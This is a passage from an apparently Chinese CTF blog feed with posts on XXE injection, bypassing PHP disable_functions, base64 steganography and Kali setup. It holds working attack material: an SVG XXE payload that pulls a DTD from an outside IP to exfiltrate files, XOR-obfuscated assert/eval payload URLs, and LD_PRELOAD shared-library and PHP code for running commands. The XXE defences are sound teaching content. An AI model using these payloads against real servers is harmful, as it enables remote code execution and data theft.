<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">""</span> //解密的字符串</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_inflate</span><span class="params">(b64string)</span>:</span></span><br><span class="line">    decode_base64 = base64.b64decode(b64string)</span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(decode_base64,<span class="number">-15</span>)</span><br><span class="line">print(decode_base64_inflate(str))</span><br></pre></td></tr></table></figure>

<p>或者直接利用php解压</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">压缩：<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"</span>);</span><br><span class="line">解压：<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1"</span>);</span><br></pre></td></tr></table></figure>

<p><strong>三丶SVG格式XXE注入</strong></p>
<p>这个姿势是Google CTF 2019的<a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">某道题</a> 这道题的<a href="https://docs.google.com/viewerng/viewer?url=https://ctrsec.io/wp-content/uploads/2019/06/Google-CTF-2019-Writeups-Web-gphotos.pptx.pdf&hl=en" target="_blank" rel="noopener">WP</a> (注意网络)学到的</p>
<p><strong><em>svg.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE svg [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://47.103.62.94:8080/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="22px" viewBox="0 0 28 22" enable-background="new 0 0 28 22" xml:space="preserve"&gt;  &lt;image id="image0" width="28" height="22" x="0" y="0"href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA"&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$domcument = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$domcument-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$img = simplexml_import_dom($domcument);</span><br><span class="line">$attrs = $img-&gt;attributes();</span><br><span class="line">$width = (int) $attrs-&gt;width;</span><br><span class="line">$height = (int) $attrs-&gt;height;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191219192450371.png" alt="image-20191219192450371"></p>
<p>虽然报了一大堆错但数据已经带出来了</p>
<p>后面发现直接用盲注的payload也行</p>
<p><img src="/2019/12/XXE注入总结/image-20191220233828942.png" alt="image-20191220233828942"></p>
<p><strong><em>四、各种平台上支持协议</em></strong></p>
<p><img src="/2019/12/XXE注入总结/20181120002647-e93bbf00-ec17-1.png" alt="20181120002647-e93bbf00-ec17-1"></p>
<p><strong><em>五、HTTP内网主机探测</em></strong></p>
<p>尝试读取网络配置文件</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta-keyword">/etc/</span>network/interfaces</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/proc/</span>net/arp</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/etc/</span>hosts</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191219225251465.png" alt="image-20191219225251465"></p>
<p><img src="/2019/12/XXE注入总结/image-20191219225453109.png" alt="image-20191219225453109"></p>
<p><img src="/2019/12/XXE注入总结/image-20191219231126267.png" alt="image-20191219231126267"></p>
<p>然后通过BurpSuit的测试器完成主机和端口探测</p>
<p><strong>六、防御XXE</strong></p>
<p><strong><em>PHP：</em></strong></p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">libxml_disable_entity_loader</span>(<span class="variable"><span class="literal">true</span></span>);</span></span><br></pre></td></tr></table></figure>

<p><strong><em>JAVA:</em></strong></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =<span class="module-access"><span class="module"><span class="identifier">DocumentBuilderFactory</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line">dbf.set<span class="constructor">ExpandEntityReferences(<span class="params">false</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="params">false</span>)</span></span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="params">false</span>)</span>;</span><br></pre></td></tr></table></figure>

<p><strong><em>Python：</em></strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="attribute">resolve_entities</span>=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>

<p><a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">XXE漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>bypass_disable_functions</title>
    <url>/2019/10/bypass-disable-functions/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a><a href="http://114.116.44.23:40001/" target="_blank" rel="noopener">RCE_ME</a></h2><h3 id="绕过-amp-获取shell"><a href="#绕过-amp-获取shell" class="headerlink" title="绕过&amp;获取shell"></a>绕过&amp;获取shell</h3><p><img src="/2019/10/bypass-disable-functions/image-20191030142752981.png" alt="image-20191030142752981"></p><p>根据代码要求：</p><ol>
<li><p>长度不能大于40</p>
</li>
<li><p>不能包含大小写字母，数字</p>
</li>
</ol><p>在PHP中两个字符异或可以得到另外一个字符，例如</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"!"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191030150348065.png" alt="image-20191030150348065"></p><p>利用这点我们就能绕过对字母数字的过滤</p><p>之后我们要绕过对长度的限制，40字符实在是限制太大了</p><a id="more"></a>








<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo(); //构造payload执行php函数</span></span><br><span class="line">$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;</span><br><span class="line">var_dump($_);      <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">var_dump(urldecode(<span class="string">"%fe%fe%fe%fe"</span>)^urldecode(<span class="string">"%a1%b9%bb%aa"</span>)); <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line"><span class="comment">#$_GET[_]($_GET[__])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&amp;_=assert</span></span><br><span class="line"><span class="comment">#&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">//code=assert(eval($_GET[a])&amp;a=phpinfo();)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030152007908.png" alt="image-20191030152007908"></p>
<p>接着构造payload让蚁剑来连</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">114.116</span>.<span class="number">44.23</span>:<span class="number">40001</span>/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[<span class="number">_</span>]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_<span class="number">_</span>]);&amp;<span class="number">_</span>=assert&amp;_<span class="number">_</span>=<span class="keyword">eval</span>($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030152338199.png" alt="image-20191030152338199"></p>
<p><img src="/2019/10/bypass-disable-functions/image-20191030152446769.png" alt="image-20191030152446769"></p>
<p>flag只有root权限才能访问，readflag估计是用来读flag的。</p>
<p>直接在虚拟终端中执行readflag命令</p>
<p><img src="/2019/10/bypass-disable-functions/image-20191030152803007.png" alt="image-20191030152803007"></p>
<p>发现命令都无法执行，查看phpinfo()；估计是调用系统命令的函数被禁用了</p>
<p> <img src="/2019/10/bypass-disable-functions/1571499768310.png" alt="1571499768310"> </p>
<h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 disable_functions  限制执行操作系统命令的方式为：</p>
<ul>
<li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li>
<li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；( LD_PRELOAD是Unix中的一个环境变量，用于定义在程序运行前优先加载的动态链接库，LD和动态库有关，PRELOAD表示预加载，结合起来就是预先加载的动态库。通过这个环境变量，可以覆盖正常的函数库中的函数。)</li>
<li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步  LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名  getuid() 所劫持；</li>
<li>达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</li>
</ul>
<h4 id="a-c文件："><a href="#a-c文件：" class="headerlink" title="a.c文件："></a>a.c文件：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> passwd[]=<span class="string">"123456"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input password!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(passwd,argv[<span class="number">1</span>]))&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Invalid\n"</span>);		  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030171503480.png" alt="image-20191030171503480"></p>
<p> 如果是不知道密码的情况下，就可以编写一个动态函数库来覆盖掉strcmp函数恒返回0以达到任意密码都返回Correct </p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(<span class="built_in">Position</span>-<span class="literal">Independent</span> Code)， 则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意 位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的</span><br></pre></td></tr></table></figure>

<p>evil.c文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"evil function\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030172344903.png" alt="image-20191030172344903"></p>
<p>所以绕过disable_functions,可以通过上传恶意so文件，劫持getuid(),达到命令执行目的。之所以劫持 getuid()，是因为 sendmail  程序会调用该函数（当然也可以为其他被调用的系统函数）</p>
<p>但是这种劫持函数的做法有很大的缺陷：</p>
<p>​    一是，某些环境中，web 禁止启用  senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改  php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进  hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入  hosts（如，127.0.0.1    lamp、lamp.、lamp.com） </p>
<h4 id="C-语言扩展修饰符"><a href="#C-语言扩展修饰符" class="headerlink" title="C 语言扩展修饰符"></a>C 语言扩展修饰符</h4><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了 </p>
<p> GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。 </p>
<p> 此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code> </p>
<h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHP中putenv()函数用于设置服务器环境变量，仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">putenv</span> ( <span class="keyword">string</span> $setting ) : bool</span><br></pre></td></tr></table></figure>

<p>如</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/evil.so"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="劫持共享库绕过disable-functions"><a href="#劫持共享库绕过disable-functions" class="headerlink" title="劫持共享库绕过disable_functions"></a>劫持共享库绕过disable_functions</h4><p>把readflag下载到本地 IDA反编译</p>
<p> <img src="/2019/10/bypass-disable-functions/1571502795907.png" alt="1571502795907"></p>
<p>bypass.c文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ; <span class="comment">//获取环境变量</span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="comment">//获取EVIL_CMDLINE的值</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//从环境变量中遍历“LD_PRELOAD”的位置，并将其值设为NULL。</span></span><br><span class="line">    <span class="comment">//从而使下面的system()正常执行。</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行命令</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>

<p>bypass.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline); <span class="comment">//设置EVIL_CMDLINE环境变量</span></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);  <span class="comment">//加载恶意动态库</span></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);  <span class="comment">//利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=include(%27/tmp/bypass.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/bypass_x64.so</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191103123740141.png" alt="image-20191103123740141"></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">参考文章2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
      </tags>
  </entry>
  <entry>
    <title>base64隐写</title>
    <url>/2019/12/base64%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这种base64隐写特征很明显，就是你会得到一大堆base64的字符串但却无法解码。写过这题就很简单，但base64的原理值得我们去研究一下。<a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">参考文章</a></p><h2 id="生成正常的有等号的base64字符串"><a href="#生成正常的有等号的base64字符串" class="headerlink" title="生成正常的有等号的base64字符串"></a>生成正常的有等号的base64字符串</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>,<span class="string">'wb+'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        ran_str = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">13</span>))</span><br><span class="line">        base64str = base64.b64encode(ran_str)</span><br><span class="line">        fp.write(base64str + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'Tr0y&#123;Base64isF4n&#125;'</span>  <span class="comment"># flag</span></span><br><span class="line">bin_str = <span class="string">''</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f0, open(<span class="string">'1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f1:  <span class="comment"># '0.txt'是明文, '1.txt'用于存放隐写后的 base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">        equalnum = rowstr.count(<span class="string">'='</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> len(bin_str):</span><br><span class="line">            offset = int(<span class="string">'0b'</span> + bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[len(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum * <span class="number">2</span>:]</span><br><span class="line">        f1.write(rowstr + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">        rowb64 = <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]) - b64chars.index(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">'='</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])  <span class="comment"># 8 位一组</span></span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">github有个工具</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/jerrita/</span>b64steg</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装与配置</title>
    <url>/2020/04/kali%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>两个月前 我输入了这条神奇的命令 <code>rm /*</code>少了一个点，然后重装了一下kali</p><p>昨天安装软件的时候突然发现 <code>/dev/sda1</code>空间用完了 吐了</p><p>再也不玩高级的分区模式了</p><p>今天重新安装，分区选新手模式了！</p><p>这里主要记录一下如何配置kali</p><h3 id="1-安装谷歌输入法"><a href="#1-安装谷歌输入法" class="headerlink" title="1.安装谷歌输入法"></a>1.安装谷歌输入法</h3><p>如果下载速度慢，选择挂代理或者换源</p><ol>
<li><p>先更新仓库</p>
<p> <code>sudo apt-get clean</code></p>
<p> <code>sudo apt-get update</code></p>
<p> <img src="/2020/04/kali安装与配置/image-20200422165456991.png" alt="image-20200422165456991"></p>
</li>
</ol><a id="more"></a>






<ol start="2">
<li><p>安装fcitx</p>
<p> <code>sudo apt-get install fcitx</code></p>
<p> <img src="/2020/04/kali安装与配置/image-20200422165915271.png" alt="image-20200422165915271"></p>
</li>
</ol>
<ol start="3">
<li><p>安装谷歌拼音</p>
<p> <code>sudo apt-get install fcitx-googlepinyin</code></p>
<p> <img src="/2020/04/kali安装与配置/image-20200422170051383.png" alt="image-20200422170051383"></p>
</li>
</ol>
<ol start="5">
<li><p>重启</p>
<p> <code>sudo reboot</code></p>
<p><img src="/2020/04/kali安装与配置/image-20200422171933298.png" alt="image-20200422171933298"></p>
</li>
</ol>
<h3 id="2-安装破解版BurpSuit"><a href="#2-安装破解版BurpSuit" class="headerlink" title="2.安装破解版BurpSuit"></a>2.安装破解版BurpSuit</h3><ol>
<li><p>安装JAVA8</p>
<p> <code>cd /opt/</code></p>
<p> <code>sudo wget https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz</code></p>
<p> <img src="/2020/04/kali安装与配置/image-20200422173241147.png" alt="image-20200422173241147"></p>
</li>
</ol>
<ol start="2">
<li><p>解压</p>
